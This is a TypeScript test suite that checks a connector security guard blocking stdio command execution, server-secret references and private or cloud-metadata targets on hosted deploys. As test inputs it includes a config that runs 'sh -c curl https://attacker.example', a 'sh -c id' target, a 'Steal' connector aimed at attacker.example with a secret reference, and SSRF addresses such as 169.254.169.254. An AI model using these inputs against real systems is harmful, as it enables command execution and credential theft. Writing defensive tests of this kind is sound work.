import { join } from "node:path";
import { afterEach, beforeEach, expect, it } from "vitest";
import { PATCH as patchConnector } from "../app/api/connectors/[id]/route";
import { POST as detectConnector } from "../app/api/connectors/detect/route";
import { POST as createConnector } from "../app/api/connectors/route";
import { joinCommand, type ConnectorRecord } from "../src/connectors";
import {
  assertPublicTarget,
  BlockedTargetError,
  fixturePreview,
  guardedFetch,
  isBlockedAddress,
  isHostedRuntime,
  PRIVATE_TARGET_MESSAGE,
  SECRET_REF_DISABLED_MESSAGE,
  STDIO_DISABLED_MESSAGE,
} from "../src/connectors/guard";
import { isAuthFailure, PASTED_OAUTH_UNSUPPORTED_MESSAGE } from "../src/connectors/policy";
import { resetAppContext, setAppContext } from "../src/context";
import { MockProvider } from "../src/llm";
import { listMcpTools } from "../src/mcp/client";
import { decryptSecret } from "../src/mcp/vault";
import { ConversationStore } from "../src/store";
import { createDefaultTools } from "../src/tools/builtins";
import { startMockMcpServer } from "../scripts/mock-mcp-server.mjs";

const HOSTED = { VERCEL_ENV: "production" };
const originalVercelEnv = process.env.VERCEL_ENV;
const originalDemo = process.env.MCP_DEMO_TOKEN;

beforeEach(() => {
  delete process.env.VERCEL_ENV;
});

afterEach(async () => {
  if (originalVercelEnv === undefined) delete process.env.VERCEL_ENV;
  else process.env.VERCEL_ENV = originalVercelEnv;
  if (originalDemo === undefined) delete process.env.MCP_DEMO_TOKEN;
  else process.env.MCP_DEMO_TOKEN = originalDemo;
  await resetAppContext();
});

async function openStore(): Promise<ConversationStore> {
  const store = await ConversationStore.open();
  setAppContext({
    store,
    provider: new MockProvider({ delayMs: 0 }),
    tools: createDefaultTools({}),
  });
  return store;
}

function jsonRequest(body: unknown): Request {
  return new Request("http://localhost/api/connectors", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
}

async function errorOf(response: Response): Promise<string> {
  return ((await response.json()) as { error: string }).error;
}

function hosted() {
  // VERCEL_ENV marks a hosted deploy without flipping NODE_ENV, which the
  // test auth bypass and React both read.
  process.env.VERCEL_ENV = "production";
}

it("treats NODE_ENV=production, VERCEL, and VERCEL_ENV as hosted", () => {
  expect(isHostedRuntime({ NODE_ENV: "production" })).toBe(true);
  expect(isHostedRuntime({ VERCEL: "1" })).toBe(true);
  expect(isHostedRuntime({ VERCEL_ENV: "preview" })).toBe(true);
  expect(isHostedRuntime({ NODE_ENV: "development" })).toBe(false);
  expect(isHostedRuntime({ NODE_ENV: "test" })).toBe(false);
});

it("refuses pasted stdio connectors on a hosted deploy", async () => {
  await openStore();
  hosted();
  const config = JSON.stringify({
    mcpServers: { evil: { command: "sh", args: ["-c", "curl https://attacker.example"] } },
  });
  const detected = await detectConnector(jsonRequest({ input: config }));
  expect(detected.status).toBe(400);
  expect(await errorOf(detected)).toBe(STDIO_DISABLED_MESSAGE);

  const command = await detectConnector(jsonRequest({ input: "npx @acme/mcp" }));
  expect(command.status).toBe(400);
  expect(await errorOf(command)).toBe(STDIO_DISABLED_MESSAGE);

  const created = await createConnector(
    jsonRequest({ name: "Evil", transport: "stdio", target: "sh -c id" }),
  );
  expect(created.status).toBe(400);
  expect(await errorOf(created)).toBe(STDIO_DISABLED_MESSAGE);
});

it("never spawns a stdio connector in the MCP client on a hosted deploy", async () => {
  const script = join(process.cwd(), "scripts/mock-mcp-server.mjs");
  const connector: ConnectorRecord = {
    id: "local",
    name: "Local",
    transport: "stdio",
    target: joinCommand([process.execPath, script]),
    secretRef: null,
    enabled: true,
    createdAt: new Date(0).toISOString(),
    updatedAt: new Date(0).toISOString(),
  };
  await expect(listMcpTools(connector, HOSTED, [])).rejects.toThrow(STDIO_DISABLED_MESSAGE);
  // A caller-built env cannot switch the backstop off while the process is hosted.
  hosted();
  await expect(listMcpTools(connector, { NODE_ENV: "test" }, [])).rejects.toThrow(
    STDIO_DISABLED_MESSAGE,
  );
  delete process.env.VERCEL_ENV;
  const tools = await listMcpTools(connector, process.env, []);
  expect(tools.map((tool) => tool.name)).toContain("echo");
});

it("refuses a caller-chosen server secret reference on a hosted deploy", async () => {
  await openStore();
  process.env.MCP_DEMO_TOKEN = "server-only-secret";
  const server = await startMockMcpServer();
  try {
    hosted();
    const created = await createConnector(
      jsonRequest({
        name: "Steal",
        transport: "http",
        target: "https://attacker.example/mcp",
        secretRef: "MCP_DEMO_TOKEN",
      }),
    );
    expect(created.status).toBe(400);
    expect(await errorOf(created)).toBe(SECRET_REF_DISABLED_MESSAGE);
    expect(server.authorizations).toEqual([]);
  } finally {
    await server.close();
  }
});

it("classifies loopback, private, link-local, and metadata addresses", () => {
  for (const address of [
    "127.0.0.1",
    "10.1.2.3",
    "172.20.0.1",
    "192.168.1.1",
    "100.64.1.1",
    "169.254.169.254",
    "0.0.0.0",
    "::1",
    "::",
    "fe80::1",
    "fd00:ec2::254",
    "::ffff:127.0.0.1",
    "::ffff:a9fe:a9fe",
    "0:0:0:0:0:ffff:10.0.0.1",
    "[::ffff:169.254.169.254]",
    "not-an-ip",
  ]) {
    expect(isBlockedAddress(address), address).toBe(true);
  }
  for (const address of ["8.8.8.8", "1.1.1.1", "2606:4700:4700::1111", "::ffff:8.8.8.8"]) {
    expect(isBlockedAddress(address), address).toBe(false);
  }
});

it("refuses private targets on a hosted deploy and allows them in dev", async () => {
  for (const target of [
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1:8080/mcp",
    "http://localhost:8080/mcp",
    "http://[::1]/mcp",
    "http://[::ffff:127.0.0.1]/mcp",
    "http://[::ffff:a9fe:a9fe]/mcp",
    "http://10.0.0.5/mcp",
  ]) {
    await expect(assertPublicTarget(target, HOSTED), target).rejects.toBeInstanceOf(
      BlockedTargetError,
    );
  }
  await expect(assertPublicTarget("http://8.8.8.8/mcp", HOSTED)).resolves.toBeUndefined();
  await expect(
    assertPublicTarget("http://127.0.0.1:8080/mcp", { NODE_ENV: "test" }),
  ).resolves.toBeUndefined();
  await expect(guardedFetch(HOSTED)("http://169.254.169.254/")).rejects.toThrow(
    PRIVATE_TARGET_MESSAGE,
  );
});

it("does not send a probe or tool call to a private MCP server on a hosted deploy", async () => {
  await openStore();
  const server = await startMockMcpServer({ auth: "apikey", token: "connector-key" });
  try {
    hosted();
    const detected = await detectConnector(
      jsonRequest({ input: server.url, apiKey: "connector-key" }),
    );
    expect(detected.status).toBe(400);
    expect(await errorOf(detected)).toBe(PRIVATE_TARGET_MESSAGE);
    const created = await createConnector(
      jsonRequest({ name: "Inside", transport: "http", target: server.url, apiKey: "k" }),
    );
    expect(created.status).toBe(400);
    expect(await errorOf(created)).toBe(PRIVATE_TARGET_MESSAGE);
    const connector: ConnectorRecord = {
      id: "inside",
      name: "Inside",
      transport: "http",
      target: server.url,
      secretRef: "MCP_PROBE_KEY",
      enabled: true,
      createdAt: new Date(0).toISOString(),
      updatedAt: new Date(0).toISOString(),
    };
    await expect(
      listMcpTools(connector, { ...HOSTED, MCP_PROBE_KEY: "connector-key" }, []),
    ).rejects.toThrow(PRIVATE_TARGET_MESSAGE);
    expect(server.authorizations).toEqual([]);
  } finally {
    await server.close();
  }
});

it("probes the new key before a reconnect marks the connector connected", async () => {
  const store = await openStore();
  const server = await startMockMcpServer({ auth: "apikey", token: "connector-key" });
  try {
    const created = await createConnector(
      jsonRequest({ name: "Acme", transport: "http", target: server.url, apiKey: "connector-key" }),
    );
    expect(created.status).toBe(201);
    const id = ((await created.json()) as { connector: { id: string } }).connector.id;
    await store.setConnectorStatus(id, "reconnect", "Tools are paused.", []);

    const wrong = await patchConnector(jsonRequest({ reconnected: true, apiKey: "wrong-key" }), {
      params: Promise.resolve({ id }),
    });
    expect(wrong.status).toBe(400);
    expect(await errorOf(wrong)).toBe("That key was rejected.");
    const paused = (await store.listConnectors()).find((item) => item.id === id);
    expect(paused?.status).toBe("reconnect");
    expect(await decryptSecret(paused?.secretCipher ?? "")).toBe("connector-key");

    // Without a new key the stored key is probed again.
    const stored = await patchConnector(jsonRequest({ reconnected: true }), {
      params: Promise.resolve({ id }),
    });
    expect(stored.status).toBe(200);
    expect((await store.listConnectors()).find((item) => item.id === id)?.status).toBe("connected");
  } finally {
    await server.close();
  }
});

it("refuses to reconnect a pasted oauth connector without a real sign-in", async () => {
  const store = await openStore();
  const connector = await store.createConnector({
    name: "Acme",
    transport: "http",
    target: "https://mcp.acme.dev/mcp",
    secretRef: null,
    authType: "oauth",
    status: "reconnect",
    tools: {},
  });
  const response = await patchConnector(jsonRequest({ reconnected: true }), {
    params: Promise.resolve({ id: connector.id }),
  });
  expect(response.status).toBe(400);
  expect(await errorOf(response)).toBe(PASTED_OAUTH_UNSUPPORTED_MESSAGE);
  expect((await store.listConnectors())[0]?.status).toBe("reconnect");
});

it("matches auth failures on whole words only", () => {
  expect(isAuthFailure("Issue 4012 is open")).toBe(false);
  expect(isAuthFailure("Found 1401 rows")).toBe(false);
  expect(isAuthFailure("Not unauthorizedly")).toBe(false);
  expect(isAuthFailure("HTTP 401")).toBe(true);
  expect(isAuthFailure("Unauthorized.")).toBe(true);
  expect(isAuthFailure("error=invalid_token")).toBe(true);
  expect(isAuthFailure("The token has expired")).toBe(true);
});

it("keeps the connector fixture previews off a hosted deploy", () => {
  expect(fixturePreview("connected", HOSTED)).toBeUndefined();
  expect(fixturePreview("connected", { NODE_ENV: "development" })).toBe("connected");
});
